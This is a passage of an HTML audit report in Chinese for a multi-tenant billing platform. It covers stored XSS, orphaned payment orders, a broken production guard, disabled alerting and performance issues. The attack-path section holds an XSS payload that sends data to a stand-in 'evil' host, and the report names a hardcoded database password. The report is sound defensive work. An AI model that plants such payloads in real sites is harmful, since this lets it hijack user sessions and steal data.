+      <strong>问题：</strong> 最新提交 d1783f9“代理可自配页脚”引入的 <code>footerHtml</code>，前端在设置后<strong>无任何净化</strong>地经 <code>dangerouslySetInnerHTML</code> 渲染；后端 <code>siteconfig/policy.go</code> 的 <code>ValidatePatch</code> 校验了 ThemeColor/HomeMode/CustomHTML，却<strong>唯独不校验 Footer</strong>——值得注意的是同一函数把 <code>CustomHTML</code> 一期直接锁死（<code>ErrHomeModeLocked</code>），说明作者清楚富文本 HTML 的风险，只是在 footer 这条新路径上漏了。更讽刺的是<strong>同一代码库已打包 DOMPurify</strong> 并用于 html-content.tsx:30 / markdown.tsx:703，净化能力就在一个 import 之外。
+    </div>
+    <div class="evidence">footer.tsx:236  &lt;div className='custom-footer …' dangerouslySetInnerHTML={{ __html: footerHtml }} /&gt;   ← 无净化
+use-tenant-brand.ts:76-81  override.footerHtml = ownFooter（取自 GET /api/tenant/current 的 footer）
+internal/mtwire/http.go:163  返回 "footer": cfg.Footer 原样
+siteconfig/policy.go:33-47  ValidatePatch 不含 Footer 分支；siteconfig/model.go:237-239 applyPatch 直写 cfg.Footer
+写入门：mt-router.go:138 → mtwire/siteconfig.go:128 HandleAgentUpdateSiteConfig，RequireAgentLevel(1)</div>
+    <div class="problem" style="margin-top:4px">
+      <strong>攻击路径：</strong> level≥1（OEM/独立）代理 <code>PUT /api/tenant/site-config</code> 提交 <code>{"footer":"&lt;img src=x onerror='fetch(//evil?c='+…)'&gt;"}</code> → 存入 <code>tenant_site_configs.footer</code> → 其站点每个访客经 <code>/api/tenant/current</code> 取回并在<strong>每一页（含登录页）</strong>执行。会话 cookie 是 HttpOnly + host-only + SameSite=Strict（<strong>偷不到 cookie、也打不到主站/其它租户</strong>），但注入脚本同源、可驱动受害者已认证会话（铸 API key 并外泄 → 持续盗刷额度记在受害者账上），且因 footer 在登录页也渲染，可叠加钓鱼表单在入口处收割终端用户凭据。爆炸半径限于该代理自己的下级用户。
+    </div>
+    <div class="fix-box">
+      <div class="fix-label">最小修复（~0.5 天）</div>
+      <code>渲染处接入已打包的 DOMPurify：dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(footerHtml, { 允许标签白名单, 禁 script/on*/javascript: }) }}
+并在服务端 ValidatePatch 对 Footer 做同等白名单净化 + 长度上限；同一处理扩展到未来的 announcement / customer_service 等富文本字段</code>
+    </div>
+    <div class="fix-box" style="margin-top:6px;background:#fff8e1;border-color:#ffe082">
+      <strong>⏱ 工作量：</strong> ~0.5 天 &nbsp;·&nbsp; <strong>回归测试：</strong> 前端渲染 <code>footerHtml='&lt;img src=x onerror=alert(1)&gt;'</code> 断言 onerror/script 不残留；后端表驱动断言含 <code>&lt;script&gt;</code> 的 footer 被拒或被剥离。
+    </div>
+  </div>
+
+  <!-- H: AGT orphan -->
+  <div class="finding severity-high">
+    <div class="finding-header">
+      <h4>3. 付费开通代理订单在 slug 冲突时永久孤儿：钱收了、代理没开、无对账、无告警</h4>
+      <span class="badge badge-high">High</span>
+      <span class="badge badge-confirmed">Confirmed</span>
+    </div>
+    <div class="finding-meta">
+      <span>📁 稳定性（部分失败状态一致性 · 钱路径）</span>
+      <span>📍 http_agentplan.go:308-329 · agent_plan_bridge.go:137-251 · reconcile_orchestrate.go:37-72 · breakage/gormrepo.go:228-240</span>
+      <span>🎯 代理套餐（AGT）购买 → 激活链路</span>
+    </div>
+    <div class="problem">
+      <strong>问题：</strong> 用户购买“代理会员套餐”时（<code>HandlePurchaseAgentPlan</code>），前端传入的 <code>slug</code>/<code>name</code> 被<strong>原样存入订单并立即返回真实支付凭据，购买时不做任何 slug 格式/保留字/唯一性校验</strong>。slug 只在<strong>付款之后的激活阶段</strong>才由 <code>TenantService.Create</code> 校验；若 slug 是保留字（如 api/www）或已被其它租户占用，<code>Create</code> 报错 → <code>provisionAgentFromOrder</code> 报错 → <code>pending→activated</code> 的 CAS 永不执行。代码注释自己承认“AGT 无对账兜底，绝不能留 activated-未 provision 卡单”，但恰恰是<strong>付款-未激活</strong>这个状态既无对账扫描、也不被异常告警计数覆盖（<code>AnomalyCount</code> 只 COUNT <code>payment_orders</code>，而 AGT 订单在 <code>mt_agent_plan_orders</code>）。
+    </div>
+    <div class="evidence">http_agentplan.go:321-322  Slug: body.Slug, Name: body.Name  ← 购买时直存用户输入，前面无校验即返回支付凭据
+agent_plan_bridge.go:161  provisionAgentFromOrder → TenantService.Create 校验 slug，失败则 err
+agent_plan_bridge.go:166-177  只有 provision 成功才跑 pending→activated CAS
+agent_plan_bridge.go:137-138  注释：「AGT 无对账兜底，绝不能留 activated-未provision 卡单」
+reconcile_orchestrate.go:37-72  只扫 RCG/SUB，不扫 mt_agent_plan_orders
+breakage/gormrepo.go:228-240  AnomalyCount = COUNT payment_orders → AGT 永不告警
+线上实测：mt_agent_plan_orders 有 4 笔 pending；mt_subscription_orders 有 5 笔 pending（7-04 创建、9 天、updated_at 从未变动）</div>
+    <div class="problem" style="margin-top:4px">
+      <strong>失败场景：</strong> 用户买代理套餐时传入保留/已占用的 slug（或两人合法地抢同一 slug、都先付款）→ 支付在网关侧成功扣款 → 每次微信/支付宝回调都在 <code>TenantService.Create</code> 处确定性失败、返回 <code>ackNotifyFail</code> → 平台重试约 24h 全部失败 → 订单永久 <code>pending</code>。无对账扫描它、无异常告警计数它、无 admin 端点能对账 AGT。<strong>用户可见影响：付了真金白银、拿不到代理账户、零自动恢复、零运维可见</strong>。（当前线上 4 笔 pending 高度符合“下单没付的废单”特征，但缺陷本身正是<strong>系统无法区分废单与真卡单</strong>——若其中有真付款者，永远不会被发现。）
+    </div>
+    <div class="fix-box">
+      <div class="fix-label">最小修复（0.5–1.5 天）</div>
+      <code>1) 购买时（HandlePurchaseAgentPlan）先校验 slug 可用性/格式，拒绝后再返回支付凭据 → 激活不再可能因 slug 确定性失败
+2) 激活时兜底派生一个保证唯一的 slug，而非报错
+3) 增加 AGT 对账路径（镜像 ReconcileStuckSubscriptions：扫超期 pending → 查网关 → 已付则重驱激活 / 持续失败则上报 admin 退款）
+4) AnomalyCount 纳入 mt_subscription_orders + mt_agent_plan_orders，让每日告警覆盖所有入金订单类型</code>
+    </div>
+    <div class="fix-box" style="margin-top:6px;background:#fff8e1;border-color:#ffe082">
+      <strong>⏱ 工作量：</strong> 购买时校验数小时；完整 AGT 对账 + 告警扩围约 1 天 &nbsp;·&nbsp; <strong>回归测试：</strong> 建保留 slug 的 AGT 订单标记已付 → 断言激活失败后有对账/告警兜底；并发同 slug 两单都付 → 两者最终都开通或败者被上报，绝不静默卡死。
+    </div>
+  </div>
+
+  <!-- H: guard_not_prod -->
+  <div class="finding severity-high">
+    <div class="finding-header">
+      <h4>4. 生产安全护栏 guard_not_prod 保护已删除旧栈，“测试”脚本实际对生产库执行破坏性操作</h4>
+      <span class="badge badge-high">High</span>
+      <span class="badge badge-confirmed">Confirmed</span>
+    </div>
+    <div class="finding-meta">
+      <span>📁 发布 / 稳定（环境分离）</span>
+      <span>📍 deploy/ops/lib.sh:16,49,57-63 · restore.sh:16 · rollback.sh:23 · backup.sh:20</span>
+      <span>🎯 运维破坏性脚本的唯一安全门</span>
+    </div>
+    <div class="problem">
+      <strong>问题：</strong> 所有“测试栈”运维脚本的唯一安全护栏 <code>guard_not_prod()</code> 只在栈名等于 <code>newapi_YFNf</code> 时中止，而 <code>newapi_YFNf</code> 已于 2026-07-03 <strong>删除</strong>，如今 <code>newapi_test</code> 才是承载三个真实域名、真实用户与支付的<strong>唯一生产栈</strong>。于是护栏<strong>永远不会触发</strong>，而 <code>restore.sh</code> 会 <code>DROP</code>/覆盖<strong>生产</strong>数据库（<code>gunzip … | mysql</code>），且 <code>ASSUME_YES=1 ./restore.sh</code> 会跳过确认。命名（“测试栈 / 自测编排 / test”）主动诱导把生产当可丢弃对象。
+    </div>
+    <div class="evidence">lib.sh:49  PROD_STACK="${PROD_STACK:-newapi_YFNf}"（已删除的栈名）
+lib.sh:16  STACK="${STACK:-newapi_test}"（真实生产）
+restore.sh:16 / rollback.sh:23 / backup.sh:20  调 guard_not_prod 后操作 newapi_test
+线上 docker ps 确认：只有 newapi_test-* 容器存在（newapi_YFNf 已不存在）</div>
+    <div class="problem" style="margin-top:4px">
+      <strong>失败场景：</strong> 运维（或带 <code>ASSUME_YES=1</code> 的自动化/cron）以为在操作一次性测试栈，运行 <code>restore.sh &lt;旧 dump&gt;</code>，不可逆地覆盖线上客户/计费数据；<code>guard_not_prod</code> 不会拦。
+    </div>
+    <div class="fix-box">
+      <div class="fix-label">最小修复（1–2 小时）</div>
+      <code>1) 护栏指向真实生产：PROD_STACK=newapi_test（或加显式 IS_PRODUCTION=1 门）
+2) 破坏性脚本即使 ASSUME_YES 也要求键入确认，除非额外设 I_UNDERSTAND_THIS_IS_PROD=1
+3) 把栈名/文档从“test”改名，或在 lib.sh 顶部加醒目“THIS IS PRODUCTION”横幅</code>
+    </div>
+    <div class="fix-box" style="margin-top:6px;background:#fff8e1;border-color:#ffe082">
+      <strong>⏱ 工作量：</strong> 1–2 小时 &nbsp;·&nbsp; <strong>回归测试：</strong> shell 测试以 mock docker 运行每个破坏性脚本，断言未设生产确认变量时拒绝执行。
+    </div>
+  </div>
+
+  <!-- H: alerting disabled -->
+  <div class="finding severity-high">
+    <div class="finding-header">
+      <h4>5. 整套应用内告警在生产被禁用 → 支付卡单等 Critical 告警对象被静默丢弃</h4>
+      <span class="badge badge-high">High</span>
+      <span class="badge badge-confirmed">Confirmed</span>
+    </div>
+    <div class="finding-meta">
+      <span>📁 可观测 / 稳定（告警）</span>
+      <span>📍 internal/alert/sink.go:132-136 · config.go:42-55 · breakage_snapshot_loop.go:106-131</span>
+      <span>🎯 唯一的主动推送告警通道</span>
+    </div>
+    <div class="problem">
+      <strong>问题：</strong> 告警模块设计良好（邮件/webhook、去重）且<strong>已完整实现</strong>，但 <code>Dispatch</code> 在 <code>!cfg.Enabled</code> 时直接早返回；<code>Enabled = get("breakage_alert_enabled")=="true"</code>，而<strong>线上 DB 查询 <code>breakage_alert%</code> 选项返回零行</strong> → <code>Enabled=false</code> → 所有告警被静默丢弃。唯一的告警生产者是每日 breakage 循环的三次 Dispatch，其中包含 <code>LevelCritical</code> 的<strong>“支付异常卡单告警”</strong>。SMTP 已完整配置（用于邮箱验证，投递本可工作），只是这个功能开关没开，且没有任何 UI/启动提示告诉运维“告警是关的”。
+    </div>
+    <div class="evidence">sink.go:132-136  if !cfg.Enabled { return }  ← 早返回，Dispatch 变 no-op
+config.go:42-55  Enabled = get("breakage_alert_enabled") == "true"
+线上 DB：SELECT ... WHERE key LIKE 'breakage_alert%' → 0 行 → Enabled=false
+breakage_snapshot_loop.go:106-131  dispatchBreakageAlerts（含 LevelCritical 支付异常卡单告警）→ 全被丢弃</div>
+    <div class="problem" style="margin-top:4px">
+      <strong>失败场景：</strong> 微信回调在证书轮换后开始失败，40 名用户付款未入账。每日 breakage 循环构造 <code>LevelCritical</code> 异常告警 → <code>Dispatch</code> no-op → 无人被通知 → 数天后靠用户投诉才发现。<strong>这个平台上最危险的生产事件（付而未入账堆积、额度沉淀、套餐满额）都会生成格式完好的 Critical 告警对象、然后被扔掉。</strong>
+    </div>
+    <div class="fix-box">
+      <div class="fix-label">最小修复（30 分钟配置 + 1 小时可见性）</div>
+      <code>1) 后台「系统设置 → 告警」设 breakage_alert_enabled=true + breakage_alert_email（或 webhook）
+2) 启动时若告警处于禁用态，打一行 WARN 日志 / 在健康标识里暴露该状态，让“关着”这件事本身可见</code>
+    </div>
+    <div class="fix-box" style="margin-top:6px;background:#fff8e1;border-color:#ffe082">
+      <strong>⏱ 工作量：</strong> 30 分钟（配置）+ 1 小时（启动可见性 + 测试） &nbsp;·&nbsp; <strong>回归测试：</strong> 集成测试断言 Enabled=true + 假 sink 时，模拟卡单恰好派发一条 Critical 告警；启动断言在告警禁用时打出 WARN。
+    </div>
+  </div>
+
+  <!-- H: reconcile no push alert -->
+  <div class="finding severity-high">
+    <div class="finding-header">
+      <h4>6. 对账循环停摆/持续失败无主动告警（线上实证：每 5 分钟 3 笔订阅对账失败、零通知）</h4>
+      <span class="badge badge-high">High</span>
+      <span class="badge badge-confirmed">Confirmed</span>
+    </div>
+    <div class="finding-meta">
+      <span>📁 可观测 / 稳定（告警 · HealthCheck）</span>
+      <span>📍 reconcile_orchestrate.go:56-67 · reconcile_loop.go:55-64 · loop_safe.go:23-25</span>
+      <span>🎯 支付对账循环健康</span>
+    </div>
+    <div class="problem">
+      <strong>问题：</strong> 上次 High #1（对账循环首次 panic 即永久停摆）的<strong>根因已修</strong>（<code>safeLoopRun</code> 逐轮 recover，见下方稳定性小节），但<strong>“停摆了运维能不能发现”这个检测缺口只补了一半</strong>：心跳表 <code>reconcile_heartbeat</code> 每轮写入，但唯一消费者是 admin HTTP 端点（被动展示），没有任何代码比较 <code>last_run_at</code> 与当前时间来对陈旧性告警，也没有对失败计数上升告警；<code>safeLoopRun</code> 恢复一次 panic 只打一行 <code>SysError</code>、不告警。更糟的是 <code>runReconcileOnce</code> 用 <code>context.Background()</code> 无超时——上游 <code>QueryOrder</code> 挂起会让 <code>reconcileRunning=true</code> 永久为真、心跳静默冻结、循环“看起来活着”却什么都不对账。
+    </div>
+    <div class="evidence">线上实证（容器日志 + DB heartbeat）：
+  reconcile SUB: scanned=5 activated=0 unpaid=2 failed=3   ← 每轮 3 笔订阅对账失败
+  reconcile_heartbeat: last_run_at=2026-07-14 03:13:14, today_runs=137, last_failed_count=3（持续）
+reconcile_loop.go:61  runReconcileOnce 使用 context.Background()，无超时
+reconcile_history.go:71-98 写心跳；reconcile_http.go:55 唯一（被动 pull）消费者
+唯一主动告警 breakage_snapshot_loop.go:123-130 只 key 于 AnomalyCount（仅数 RCG payment_orders）</div>
+    <div class="problem" style="margin-top:4px">
+      <strong>失败场景：</strong> 服务商查单 API 开始超时 → <code>runReconcileAll</code> 阻塞 → 心跳冻结在某个时间戳 → 循环“看起来活着”（goroutine 挂起）但一周不对账任何订单 → 直到卡单堆积、无人察觉。当前线上每 5 分钟已有 3 笔失败、无任何推送，正是这个缺口的现网体现。
+    </div>
+    <div class="fix-box">
+      <div class="fix-label">最小修复（3–4 小时，依赖发现 #5 先开告警开关）</div>
+      <code>1) 在每日 breakage 循环（已 master-only、已接 AlertSink）加：now - last_run_at > 30min → Critical 告警；last_failed_count > 0 连续 K 轮 → 告警
+2) 给 runReconcileOnce 加 context 超时，避免上游挂起导致心跳静默冻结
+3) AnomalyCount 扩围纳入 SUB/AGT</code>
+    </div>
+    <div class="fix-box" style="margin-top:6px;background:#fff8e1;border-color:#ffe082">
+      <strong>⏱ 工作量：</strong> 3–4 小时 &nbsp;·&nbsp; <strong>回归测试：</strong> 单测心跳超阈值 / <code>last_failed_count&gt;0</code> 时派发告警；<code>runReconcileOnce</code> 在查单 stub 阻塞时能在超时内返回。
+    </div>
+  </div>
+
+  <!-- ══════════ 安全维度 ══════════ -->
+  <h3 class="section-title" id="security">🔒 安全 Security</h3>
+  <div class="card">
+    <div class="card-header">🧭 覆盖说明</div>
+    <div class="card-body">
+      <p><strong>覆盖度：</strong> High</p>
+      <p><strong>已检视证据：</strong> 鉴权中间件与全部 <code>/api/tenant|admin|internal</code> 端点挂载逐个核对；5 处 dangerouslySetInnerHTML 全部追踪（2 处 DOMPurify 净化、1 静态、1 图表、1 页脚=漏洞）；支付验签/金额权威/幂等台账；多租户横向越权（自研 handler 一律用中间件校验的 tenant_id）；上传校验；SQLi/os.exec/硬编码密钥 grep；线上端口暴露面与密钥比对。</p>
+      <p><strong>排除 / 局限：</strong> 上游 relay/ 与原生 controller 仅当自研改动或多租户场景新增风险时报；2FA/OAuth 上游流程、moderation 绕过深链未逐行；生产 .env 仅布尔比对不读值；Cloudflare WAF/规则我方不可见。</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">发现 <span style="font-weight:400;font-size:13px;color:var(--text-secondary)">· 9 条（1 Critical · 1 High · 1 Medium · 6 Low）</span></div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>发现</th><th style="width:100px">严重程度</th><th style="width:100px">状态</th></tr></thead>
+          <tbody>
+            <tr><td>会话/加密签名密钥是 git 提交值，生产在用 → 管理员会话伪造（详见发现 #1）</td><td><span class="badge badge-critical">Critical</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>代理自配页脚未净化 HTML → 存储型 XSS（详见发现 #2）</td><td><span class="badge badge-high">High</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>MySQL root 密码 testpass123 硬编码提交进 compose + lib.sh 默认（缓解：DB 未对公网暴露，仅 docker 内网可达）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>源站零安全响应头（无 HSTS/X-Frame-Options/nosniff/CSP/Referrer-Policy；Server: nginx 暴露类型）——CF 可能补部分，我方不可见</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>FTP 21（pure-ftpd）+ 宝塔面板 8889/888 对公网开放，扩大攻击面（若未使用应关闭）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>init.go 密钥校验只拦上游 random_string，不拦项目占位符 change-me / 空值（现网已正确配置，属下个部署者的隐患）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>logo_url/favicon_url 无 scheme 校验（img/link 上下文不执行 JS，非 XSS，至多内容欺骗/追踪像素）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>CORS AllowAllOrigins=true + 会话 cookie Secure:false（当前因 SameSite=Strict + New-Api-User 头 + CF TLS 而无实际可利用面，属未审的上游默认）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>wxpay 回调诊断日志拼接微信传输头（Serial/Timestamp/Nonce）入错误串并落盘（回归 #30，仍未修，仅测试栈）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">✅ 已验证安全（经独立追踪确认）</div>
+    <div class="card-body">
+      <div class="check-list">
+        <div class="check-item"><span class="check">✓</span> 多租户横向隔离：自研 handler 用中间件校验的 tenant_id，不信客户端传入；跨租户写前校验归属</div>
+        <div class="check-item"><span class="check">✓</span> 支付回调官方 SDK 验签（wechatpay-go / alipay），金额以 DB 为准，客户端无法传价</div>
+        <div class="check-item"><span class="check">✓</span> 入账强幂等：mt_recharge_credit_ledger(order_no UNIQUE) 同事务扣加</div>
+        <div class="check-item"><span class="check">✓</span> 无 SQL 注入（动态片段为硬编码表达式 + asc/desc 白名单）、无 os/exec、无硬编码业务密钥</div>
+        <div class="check-item"><span class="check">✓</span> 上传双重把关：扩展名白名单 + DetectContentType 嗅探 + 2MB 上限，存为 data: URL 无路径穿越</div>
+        <div class="check-item"><span class="check">✓</span> 登录/注册/找回均带 CriticalRateLimit + Turnstile；access_token 需双 header</div>
+        <div class="check-item"><span class="check">✓</span> 会话 cookie HttpOnly + host-only + SameSite=Strict（限制了 XSS 的爆炸半径）</div>
+        <div class="check-item"><span class="check">✓</span> .gitignore 正确排除 .env/.pem；git 历史无提交的 .env/私钥（唯一例外是 compose 内联 SESSION_SECRET，见发现 #1）</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ 稳定性维度 ══════════ -->
+  <h3 class="section-title" id="stability">⚡ 稳定性 Stability</h3>
+  <div class="card">
+    <div class="card-header">🧭 覆盖说明</div>
+    <div class="card-body">
+      <p><strong>覆盖度：</strong> High（聚焦钱路径 + 后台任务/goroutine）</p>
+      <p><strong>已检视证据：</strong> 全读 reconcile/loop_safe/breakage_snapshot/agent_plan_expiry/billing_writer/recharge/subscription_bridge/sub_reconcile/agent_plan_bridge，payment/{credit,reconcile}，wallet/agent gormrepo；49 处 go func 清点（全为 gopool.Go + safeLoopRun）；未检查类型断言、panic、外部调用超时、信号处理；<code>go build ./internal/...</code> 通过；线上查 SUB/AGT 订单状态分布与 reconcile 心跳。</p>
+      <p><strong>排除 / 局限：</strong> 未在运行时制造真实失败回调（Mac 只读）；siteconfig/tenant/ticket/stats repo 以 grep + 抽读为主；relay 上游 goroutine 与 gin server.Run 作边界。</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">发现 <span style="font-weight:400;font-size:13px;color:var(--text-secondary)">· 4 条（2 High · 1 Medium · 1 Info）</span></div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>发现</th><th style="width:100px">严重程度</th><th style="width:100px">状态</th></tr></thead>
+          <tbody>
+            <tr><td>付费代理套餐订单 slug 冲突时永久孤儿，无对账无告警（详见发现 #3）</td><td><span class="badge badge-high">High</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>对账循环停摆/持续失败无主动告警，线上每 5 分钟 3 笔订阅失败（详见发现 #6；亦属可观测）</td><td><span class="badge badge-high">High</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>SUB 订阅卡单对账无 LIMIT 全表捞 + pending 永不过期，逐个串行调外部查单 → 废单累积后劣化/打爆商户 API/拖垮整个对账循环（sub_reconcile.go:40-47）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>异步计费缓冲在硬崩溃时丢 ≤2s 代理收益 + SIGTERM 无 /v1 in-flight drain（已文档化，方向安全：只少计代理收益、绝不多付）</td><td><span class="badge badge-info">Info</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">✅ 已验证稳健（钱路径核心，独立验证未能攻破）</div>
+    <div class="card-body">
+      <div class="check-list">
+        <div class="check-item"><span class="check">✓</span> 上次 High #1（对账首次 panic 永久停摆）已修：loop_safe.go safeLoopRun 逐轮 recover，三个 master-only 循环全走它</div>
+        <div class="check-item"><span class="check">✓</span> 幂等入账 + 无双花：CAS 状态机、唯一台账、条件式 WHERE balance≥cost 不透支、兑换码单赢家 CAS</div>
+        <div class="check-item"><span class="check">✓</span> 两步订阅激活用 settled 标志 + 对账重驱补偿跨事务窗口</div>
+        <div class="check-item"><span class="check">✓</span> 外部调用均有超时 + 有界退避重试、尊重 ctx 取消</div>
+        <div class="check-item"><span class="check">✓</span> 热路径 hook（分润/违禁词/风控）均 defer recover 且内联调用，panic 不会带崩 /v1 请求</div>
+        <div class="check-item"><span class="check">✓</span> 代理套餐激活按 owner 条带锁串行化，并发回调幂等短路（tenants.slug 有唯一索引兜底）</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ 性能维度 ══════════ -->
+  <h3 class="section-title" id="performance">🚀 性能 Performance</h3>
+  <div class="card">
+    <div class="card-header">🧭 覆盖说明</div>
+    <div class="card-body">
+      <p><strong>覆盖度：</strong> High</p>
+      <p><strong>已检视证据：</strong> 全程追踪 /v1 计费热路径与 mtwire hooks，逐条数每请求同步 SQL；核对 BATCH_UPDATE/AGENT_HOOK_ASYNC gating 与 git 时间线；量了 dist/ 前端块体积、three.js 引入方式、路由分割、虚拟化、死依赖；线上取 MySQL 变量（buffer pool 128MB / flush_log=2 / sync_binlog=0 / max_connections=151 / 命中率 99.994%）+ /api/status 运行时开关。</p>
+      <p><strong>排除 / 局限：</strong> <strong>线上 slow_query_log=OFF</strong>，索引建议为静态分析、无生产慢日志佐证；<strong>ON 配置下无新压测</strong>，旧 31rps/32ms 基线（2026-07-08 测于 BATCH_UPDATE=OFF）已作废，当前吞吐上限标 Suspected 需复测；image/audio/mjproxy relay 变体未深挖（文本为核心流量）。</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-body">
+      <p class="small"><strong>关键澄清（已用三重证据坐实并纠正流传说法）：</strong> 网传“每请求多次 fsync 写 MySQL（~30ms）”在 DB 层<strong>不成立</strong>——线上 <code>innodb_flush_log_at_trx_commit=2</code> + <code>sync_binlog=0</code>，每次事务提交根本不做 fsync。且计费写放大（上次 Medium）<strong>已修复并部署生效</strong>：<code>BATCH_UPDATE_ENABLED=true</code> + <code>AGENT_HOOK_ASYNC_ENABLED=true</code> 均确认 ON（printenv ×2 + 配置审计员 printenv + <code>/api/status</code> 的 <code>enable_batch_update:true</code> + 容器创建 07-14 02:02 晚于 compose 改动 07-08/09），无 config drift。每请求同步写已从约 8 条降到 <strong>1 条</strong>（仅消耗日志 INSERT），原先描述的 users.quota 三重行锁串行在当前配置下<strong>不再发生</strong>。因此性能瓶颈已重新定位到“未缓存的重复读 + 重索引 INSERT”，而非写锁。</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">发现 <span style="font-weight:400;font-size:13px;color:var(--text-secondary)">· 10 条（6 Medium · 4 Low）</span></div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>发现</th><th style="width:100px">严重程度</th><th style="width:100px">状态</th></tr></thead>
+          <tbody>
+            <tr><td>计费热路径每请求 ~3-5 次未缓存 <code>SELECT tenant_id FROM users</code>（risk/grouphook/agenthook 各点，tenant_id 近乎不变却重复取）——批量落地后成为下一个热路径杠杆（回归 #16 同条）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>BATCH_UPDATE 已 ON 但 InitBatchUpdater（model/utils.go:33）无 SIGTERM flush → 每次部署/重启丢 ≤5s 额度/统计增量（方向安全：偏少计费；对比 billing_writer 有 installSignalFlush）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>breakage 快照循环全扫 tokenplan_subscriptions 物化进内存 + expire_at 无索引全表 SUM + snapshots 表无保留策略 → 订阅量涨后 OOM 风险（gormrepo:477/176）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>前端首屏 ~9.5MB raw（katex+marked+i18next 5.69MB 共享块）+ 无列表虚拟化（@tanstack/react-virtual 0 使用）+ 死依赖 recharts/shiki + 路由分割仅 prod</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>连接池 SQL_MAX_OPEN_CONNS=1000（env 未设→代码默认）超过 MySQL max_connections=151 → 尖峰时 Too many connections</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>admin GetAllLogs 对不断增长的 logs 表做无界过滤 COUNT(*) + Offset 深分页（用户侧 GetUserLogs 已有 cap，admin 侧漏了）</td><td><span class="badge badge-medium">Medium</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>innodb_buffer_pool_size=128MB 默认未调优（7.8G 机器，MySQL 仅用 522MB）；命中率 99.994% 仅因当前数据全装得下 → 快增日志表无保留，数据超 128MB 后命中率崩为磁盘 IO</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>logs 表约 13 个索引 → 每请求那唯一的同步 INSERT 维护 13 棵 B 树，写放大</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>令牌桶限流 Redis 键永不过期（rate_limit.lua 的 EXPIRE 被注释）→ 每个命中过限流器的用户留一个永不回收的 key（仅 ModelRequestRateLimit 启用时活跃）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+            <tr><td>主站首页首屏加载 3D 粒子灯泡 + 937KB 点云二进制 + 547KB three 块（已有 WebGL 失败 PNG 兜底、离屏暂停 RAF、reduced-motion 单帧等缓解）</td><td><span class="badge badge-low">Low</span></td><td><span class="badge badge-confirmed">Confirmed</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">📇 建议新增数据库索引（静态分析，需生产慢日志二次确认）</div>
+    <div class="card-body" style="padding:0">
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>表</th><th>索引（列）</th><th>原因</th><th style="width:70px">优先级</th></tr></thead>
+          <tbody>
+            <tr><td>tokenplan_subscriptions</td><td>(status, expire_at)</td><td>breakage Overview SUM + countExhaustedActiveSubs 按 expire_at 全表扫（当前无索引）</td><td>高</td></tr>
+            <tr><td>agent_earning_logs</td><td>(tenant_id, created_at)</td><td>报表按租户 + 时间范围过滤并排序；表每计费请求增一行（当前仅单列 tenant_id）</td><td>高</td></tr>
+            <tr><td>moderation_content_violations</td><td>(tenant_id, created_at)</td><td>“我的违规”列表 = WHERE tenant_id ORDER BY created_at（现单列索引触发 filesort）</td><td>中</td></tr>
+            <tr><td>mt_subscription_orders</td><td>(status, updated_at)</td><td>sub_reconcile 过滤 status + updated_at&lt;?（updated_at 无索引）</td><td>中</td></tr>
+            <tr><td>payment_orders</td><td>(status, updated_at)</td><td>RCG 对账过滤（status 已单独索引，补 updated_at）</td><td>中</td></tr>
+            <tr><td>logs</td><td>（移除）单列 ip / token_name / group</td><td>降低每请求 INSERT 写放大——先确认查询是否真用到</td><td>低</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header">✅ 已验证良好</div>
+    <div class="card-body">
+      <div class="check-list">
